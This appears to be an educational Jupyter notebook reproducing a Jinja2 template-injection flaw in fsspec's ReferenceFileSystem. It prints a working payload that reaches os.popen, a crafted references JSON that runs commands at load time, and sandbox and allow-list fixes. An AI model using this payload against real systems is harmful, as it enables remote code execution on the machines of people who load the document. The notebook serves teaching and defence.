# fsspec `ReferenceFileSystem` Jinja2 SSTI → RCE (CVE-2026-104851)

**Controlled, local-only proof-of-concept for SC3010.**

This notebook reproduces the *Server-Side Template Injection* (SSTI) class of bug in
`fsspec.implementations.reference.ReferenceFileSystem`. The `gen`/`templates` feature of
the Kerchunk-style "references" document renders attacker-controllable fields through an
**un-sandboxed** `jinja2.Template(...).render(...)`. Because Jinja2's default globals expose
Python internals, template expressions can reach `os` and execute arbitrary commands — and
this happens at *reference-load time*, before any real data is read.

It is the same shape as the `hdf5-pwn` demo in this repo: an untrusted *reference* document
is processed without isolation and turns into an attack surface.


## Vulnerability breakdown

| Attribute | Details |
|---|---|
| CVE | CVE-2026-104851 |
| Impact | Remote Code Execution (RCE) |
| Component | `fsspec.implementations.reference.ReferenceFileSystem` |
| Root cause | Fields of a "references" (Kerchunk) JSON document are passed into an un-sandboxed `jinja2.Template(...).render(...)` with no input validation |
| Trigger | `fsspec.filesystem("reference", fo=URL)` / `xarray.open_dataset("reference://...")` on an attacker-supplied document |

### How the attack works
1. The attacker hosts or supplies a malicious references JSON containing Jinja2 expressions.
2. The victim instantiates the filesystem over it (`fsspec.filesystem("reference", fo=...)`).
3. While expanding the `gen` section, the library renders template fields with an un-sandboxed
   Jinja environment. The payload executes **before** any referenced data is fetched.


## ⚠️ Safety / scope

- Run this **only on your own machine**, in the project virtualenv.
- Every payload here is **benign**: it runs `id` / evaluates `7*7` to *prove* code execution.
  There are no destructive, network, or data-exfiltration commands anywhere in this notebook.
- Do not point this at anyone else's system. This is an educational reproduction of a known
  CVE class, nothing more.


In [8]:
import json, sys
import fsspec
import jinja2

print("python :", sys.version.split()[0])
print("fsspec :", fsspec.__version__)
print("jinja2 :", jinja2.__version__)

python : 3.14.0
fsspec : 2025.10.0
jinja2 : 3.1.6


## Part 1 — The root cause in isolation

The sink is nothing more than `jinja2.Template(untrusted).render()`. A plain (un-sandboxed)
`Template` exposes default globals such as `cycler`, whose `__init__.__globals__` carries a
reference to the `os` module. That is the classic SSTI gadget. First prove the template is
*evaluated* (not treated as literal text):

In [9]:
# Proof that the string is evaluated as a template, not copied verbatim.
attacker_field = "{{ 7 * 7 }}"
rendered = jinja2.Template(attacker_field).render()
print("rendered:", repr(rendered))   # -> '49'  (template was executed)

rendered: '49'


In [10]:
# Escalate the same primitive to command execution with a BENIGN command (`id`).
# cycler is a default Jinja2 global; its __globals__ reaches the imported `os` module.
cmd = "id"   # harmless: prints the current uid/gid, nothing destructive
payload = "{{ cycler.__init__.__globals__.os.popen('" + cmd + "').read() }}"

rendered = jinja2.Template(payload).render()
print("command output via template render:\n", rendered.strip())

command output via template render:
 uid=501(xuehao) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)


## Part 2 — Triggering it through `ReferenceFileSystem`

The references format (version 1) has a `gen` section used to *generate* many references from
templated `url` / `offset` / `length` fields. Those fields are rendered with Jinja. We put the
SSTI payload in `url`, so merely constructing the filesystem over the document runs the command.

We build the malicious document in memory and hand it to fsspec via the `fo=` argument — exactly
the "victim reads an attacker-supplied reference file" scenario.

In [15]:
cmd = "ls"   # benign marker command
ssti = "{{ cycler.__init__.__globals__.os.popen('" + cmd + "').read() }}"

malicious_references = {
    "version": 1,
    "templates": {},
    "gen": [
        {
            "key": "data/{{i}}",
            "url": ssti,            # <-- attacker-controlled field, rendered by Jinja
            "offset": "0",
            "length": "0",
            "dimensions": {"i": {"stop": 1}},
        }
    ],
    "refs": {},
}
print(json.dumps(malicious_references, indent=2))

{
  "version": 1,
  "templates": {},
  "gen": [
    {
      "key": "data/{{i}}",
      "url": "{{ cycler.__init__.__globals__.os.popen('ls').read() }}",
      "offset": "0",
      "length": "0",
      "dimensions": {
        "i": {
          "stop": 1
        }
      }
    }
  ],
  "refs": {}
}


In [18]:
# Instantiating the filesystem expands `gen`, which renders the templated fields.
# The payload executes here, at load time — no real data is ever fetched.
#
# fsspec accepts the references dict directly via `fo=`. The generated `url` ends up
# holding the command output, which we can observe in the expanded reference table.

fs = fsspec.filesystem("reference", fo=malicious_references)
# The expanded references live in fs.references; the crafted key now maps to a
# url built from our executed command's output.
executed = fs.references.get("data/0")
print("expanded reference for 'data/0':")
print(executed)


expanded reference for 'data/0':
['fsspec_reference_ssti.ipynb\n', 0, 0]


## Part 3 — Remediation

Two independent fixes. Either removes the RCE; defense-in-depth uses both.

### 3a. Render inside a sandbox
`jinja2.sandbox.ImmutableSandboxedEnvironment` blocks attribute access to Python internals,
so the `cycler.__init__.__globals__...` gadget raises `SecurityError`.

In [13]:
from jinja2.sandbox import ImmutableSandboxedEnvironment

sandbox = ImmutableSandboxedEnvironment()
try:
    sandbox.from_string(ssti).render()
    print("UNEXPECTED: payload rendered (sandbox did not block it)")
except Exception as e:
    print(f"blocked by sandbox -> {type(e).__name__}: {e}")

# A legitimate, data-only template still works fine inside the sandbox:
print("benign template still works:", sandbox.from_string("chunk_{{ i }}").render(i=3))

blocked by sandbox -> SecurityError: access to attribute '__init__' of 'type' object is unsafe.
benign template still works: chunk_3


### 3b. Validate / reject untrusted template fields

Treat the references document as untrusted input: only accept templates whose variables are a
known allow-list (the declared `dimensions`), and reject any expression containing attribute
access, calls, or dunder names before rendering.

In [14]:
import re

FORBIDDEN = re.compile(r"__|\.|\(|\[")   # dunders, attribute access, calls, subscripts

def safe_field(template_str, allowed_vars):
    """Reject a template field unless it only substitutes allow-listed plain variables."""
    for expr in re.findall(r"{{(.*?)}}", template_str):
        expr = expr.strip()
        if FORBIDDEN.search(expr):
            raise ValueError(f"rejected unsafe expression: {expr!r}")
        if expr not in allowed_vars:
            raise ValueError(f"rejected unknown variable: {expr!r}")
    return template_str

allowed = {"i"}
print("benign ok  :", safe_field("data/{{i}}", allowed))
try:
    safe_field(ssti, allowed)
except ValueError as e:
    print("payload     :", e)

benign ok  : data/{{i}}
payload     : rejected unsafe expression: "cycler.__init__.__globals__.os.popen('id').read()"


## Takeaways

- **Data-as-code is the bug.** A "references" document is *data*; routing its fields through an
  un-sandboxed template engine turns data into executable code. Same root cause as the
  `hdf5-pwn` external-storage disclosure — an untrusted descriptor is trusted at read time.
- **Triggers before any "real" I/O.** The RCE fires during filesystem construction, so
  "we only open the file to read metadata" is not a mitigation.
- **Fixes:** upgrade `fsspec` past the patched release; render with a sandboxed Jinja
  environment; and/or validate template fields against an allow-list. Never pass untrusted,
  user-supplied URLs or inline JSON into `fsspec.filesystem("reference", ...)` or wrappers
  like `xarray`.
